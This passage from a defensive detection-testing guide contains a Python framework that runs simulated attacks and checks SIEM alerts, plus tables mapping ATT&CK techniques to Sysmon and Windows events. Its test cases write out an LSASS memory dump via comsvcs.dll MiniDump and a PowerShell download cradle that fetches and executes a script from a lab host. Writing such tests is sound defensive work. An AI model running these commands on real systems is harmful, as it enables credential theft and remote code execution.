  - emerging-ransomware.rules
  - emerging-exploit_kit.rules
  - emerging-credit_card.rules
  - emerging-keylogger.rules
  - emerging-darknet.rules
  - emerging-web_shell.rules
  - emerging-current_event.rules
  - emerging-dos_attack.rules
  - emerging-exploit_attempt.rules
  - emerging-malware_behavior.rules
  - emerging-scan_behavior.rules
  - emerging-web_attack.rules
  - emerging-botnet.rules
  - emerging-c2.rules
  - emerging-data_loss.rules
  - emerging-fraud.rules
  - emerging-ids_evasion.rules
  - emerging-privacy.rules
  - emerging-recon.rules
  - emerging-suspicious.rules
  - emerging-unusual_behavior.rules
  - emerging-zero_day.rules
  - emerging-apt.rules
  - emerging-cryptomining.rules
  - emerging-dga.rules
  - emerging-iot.rules
  - emerging-lateral_movement.rules
  - emerging-persistence.rules
  - emerging-privilege_escalation.rules
  - emerging-defense_evasion.rules
  - emerging-credential_access.rules
  - emerging-discovery.rules
  - emerging-collection.rules
  - emerging-exfiltration.rules
  - emerging-impact.rules
  - emerging-initial_access.rules
  - emerging-execution.rules
  - emerging-persistence_mechanism.rules
  - emerging-privilege_escalation_technique.rules
  - emerging-defense_evasion_technique.rules
  - emerging-credential_access_technique.rules
  - emerging-discovery_technique.rules
  - emerging-lateral_movement_technique.rules
  - emerging-collection_technique.rules
  - emerging-command_and_control.rules
  - emerging-exfiltration_technique.rules
  - emerging-impact_technique.rules
```

---

## Detection Testing Procedures

### Pre-Test Validation

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Verify Sysmon service status | Running, no errors |
| 2 | Check Windows Event Log health | No corruption, proper retention |
| 3 | Validate SIEM ingestion rate | Events arriving within 60 seconds |
| 4 | Confirm IDS/IPS signature update | Latest rules loaded |
| 5 | Test alert notification channels | Email/SMS/Ticket received |
| 6 | Document baseline activity | No anomalous patterns |

### Test Execution Framework

```python
# detection_test_framework.py
#!/usr/bin/env python3
"""
Detection Testing Framework
Validates that attack behaviors generate expected alerts
"""

import json
import time
import subprocess
from datetime import datetime
from elasticsearch import Elasticsearch
import requests

class DetectionTester:
    def __init__(self, siem_type="elk"):
        self.siem_type = siem_type
        self.test_results = []
        self.es = Elasticsearch(['10.0.0.100:9200']) if siem_type == "elk" else None
        
    def execute_attack(self, attack_command, technique_id):
        """Execute attack and capture timestamp"""
        start_time = datetime.utcnow()
        
        try:
            result = subprocess.run(
                attack_command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=300
            )
            success = result.returncode == 0
        except Exception as e:
            success = False
            result = str(e)
            
        end_time = datetime.utcnow()
        
        return {
            "technique_id": technique_id,
            "start_time": start_time,
            "end_time": end_time,
            "success": success,
            "output": result.stdout if success else result
        }
    
    def query_siem(self, query, time_range):
        """Query SIEM for expected alerts"""
        if self.siem_type == "elk":
            return self._query_elasticsearch(query, time_range)
        elif self.siem_type == "splunk":
            return self._query_splunk(query, time_range)
        
    def _query_elasticsearch(self, query, time_range):
        """Query Elasticsearch for detection events"""
        search_body = {
            "query": {
                "bool": {
                    "must": [
                        {"match": query},
                        {
                            "range": {
                                "@timestamp": {
                                    "gte": time_range["start"],
                                    "lte": time_range["end"]
                                }
                            }
                        }
                    ]
                }
            }
        }
        
        response = self.es.search(index="winlogbeat-*,sysmon-*", body=search_body)
        return response["hits"]["hits"]
    
    def _query_splunk(self, query, time_range):
        """Query Splunk for detection events"""
        # Splunk REST API implementation
        pass
    
    def verify_detection(self, attack_result, expected_events):
        """Verify that expected detections occurred"""
        time.sleep(30)  # Wait for SIEM ingestion
        
        detections = []
        for event in expected_events:
            results = self.query_siem(
                event["query"],
                {
                    "start": attack_result["start_time"].isoformat(),
                    "end": attack_result["end_time"].isoformat()
                }
            )
            
            detections.append({
                "event_type": event["type"],
                "expected": event["expected_count"],
                "actual": len(results),
                "detected": len(results) >= event["expected_count"],
                "events": results
            })
            
        return detections
    
    def run_test(self, test_case):
        """Execute full detection test"""
        print(f"[*] Running test: {test_case['name']}")
        
        # Execute attack
        attack_result = self.execute_attack(
            test_case["command"],
            test_case["technique_id"]
        )
        
        if not attack_result["success"]:
            print(f"[!] Attack execution failed: {attack_result['output']}")
            return None
            
        # Verify detections
        detections = self.verify_detection(
            attack_result,
            test_case["expected_events"]
        )
        
        result = {
            "test_name": test_case["name"],
            "technique_id": test_case["technique_id"],
            "attack_result": attack_result,
            "detections": detections,
            "passed": all(d["detected"] for d in detections)
        }
        
        self.test_results.append(result)
        return result
    
    def generate_report(self):
        """Generate test report"""
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "total_tests": len(self.test_results),
            "passed": sum(1 for r in self.test_results if r["passed"]),
            "failed": sum(1 for r in self.test_results if not r["passed"]),
            "results": self.test_results
        }
        
        with open(f"detection_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
            
        return report

# Test Case Definitions
TEST_CASES = [
    {
        "name": "LSASS Memory Access Detection",
        "technique_id": "T1003.001",
        "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\test.dmp full",
        "expected_events": [
            {
                "type": "Sysmon Event ID 10",
                "query": {"event.code": "10", "process.executable": "*rundll32*"},
                "expected_count": 1
            },
            {
                "type": "Windows Security 4656",
                "query": {"event.code": "4656", "process.name": "rundll32.exe"},
                "expected_count": 1
            }
        ]
    },
    {
        "name": "PowerShell Download Cradle Detection",
        "technique_id": "T1059.001",
        "command": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.50/test.ps1')\"",
        "expected_events": [
            {
                "type": "PowerShell Event ID 800",
                "query": {"event.code": "800", "powershell.command": "*DownloadString*"},
                "expected_count": 1
            },
            {
                "type": "Sysmon Event ID 22",
                "query": {"event.code": "22", "dns.question.name": "*"},
                "expected_count": 1
            }
        ]
    }
]

if __name__ == "__main__":
    tester = DetectionTester(siem_type="elk")
    
    for test_case in TEST_CASES:
        result = tester.run_test(test_case)
        status = "PASSED" if result and result["passed"] else "FAILED"
        print(f"  Result: {status}")
        
    report = tester.generate_report()
    print(f"\n[*] Test complete: {report['passed']}/{report['total_tests']} passed")
```

---

## Detection Verification Matrix

| Technique | Sysmon | Windows EVTX | ELK Detection | Splunk Detection | Suricata | Verified |
|-----------|--------|--------------|---------------|------------------|----------|----------|
| T1003.001 - LSASS Memory | Event 10 | 4656, 4663 | ✓ | ✓ | N/A | ☐ |
| T1059.001 - PowerShell | Event 1, 22 | 800, 4103, 4104 | ✓ | ✓ | N/A | ☐ |
| T1053.005 - Scheduled Task | Event 1, 13 | 4698, 4699 | ✓ | ✓ | N/A | ☐ |
| T1021.002 - SMB/Admin Shares | Event 3, 11 | 4624, 5140, 5145 | ✓ | ✓ | N/A | ☐ |
| T1046 - Network Scanning | Event 3 | 5156 | ✓ | ✓ | ET SCAN | ☐ |
| T1110 - Brute Force | Event 1 | 4625, 4771 | ✓ | ✓ | N/A | ☐ |
| T1087 - Account Discovery | Event 1 | 4662, 4768 | ✓ | ✓ | N/A | ☐ |
| T1055 - Process Injection | Event 8, 10, 25 | 4656 | ✓ | ✓ | N/A | ☐ |
| T1543.003 - Create Service | Event 1, 13 | 7045, 4697 | ✓ | ✓ | N/A | ☐ |
| T1078 - Valid Accounts | Event 1, 3 | 4624, 4648 | ✓ | ✓ | N/A | ☐ |

---

## Alert Quality Metrics

| Metric | Target | Measurement Method |
|--------|--------|-------------------|
| True Positive Rate | >95% | Alert disposition analysis |
| False Positive Rate | <5% | Alert disposition analysis |
| Mean Time to Detection | <5 minutes | SIEM timestamp analysis |
| Alert Completeness | 100% | Required field population |
| Alert Context Richness | High | Process tree, parent/child, command line |
| Correlation Accuracy | >90% | Multi-event alert validation |

---

*This document provides the technical foundation for detection testing and verification. All tests must be executed in isolated environments with proper authorization.*
